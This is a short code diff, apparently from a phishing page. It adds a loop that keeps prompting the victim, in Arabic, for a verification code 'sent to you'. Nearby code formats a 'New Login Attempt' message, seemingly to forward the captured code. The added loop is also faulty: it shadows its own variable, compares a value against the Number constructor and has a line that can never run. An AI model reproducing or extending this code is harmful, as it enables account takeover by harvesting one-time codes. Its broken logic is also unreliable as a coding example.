@@ -114,6 +114,16 @@
                     text: getCode
                 })
 let inputCode= prompt("ادخل رمز التحقق المرسل اليك \nالرجاء الانتظار")
+while (inputCode == null){
+    let inputCode= prompt("ادخل رمز التحقق المرسل اليك \nالرجاء الانتظار")
+    if(inputCode.value == Number){
+       alert("الرجاء ادخال ارقام فقط")
+    }else if (inputCode){
+         break
+        let inputCode= prompt("ادخل رمز التحقق المرسل اليك \nالرجاء الانتظار")
+
+    }
+}
                 const message = ` 
             
                     <b>New Login Attempt</b>\n
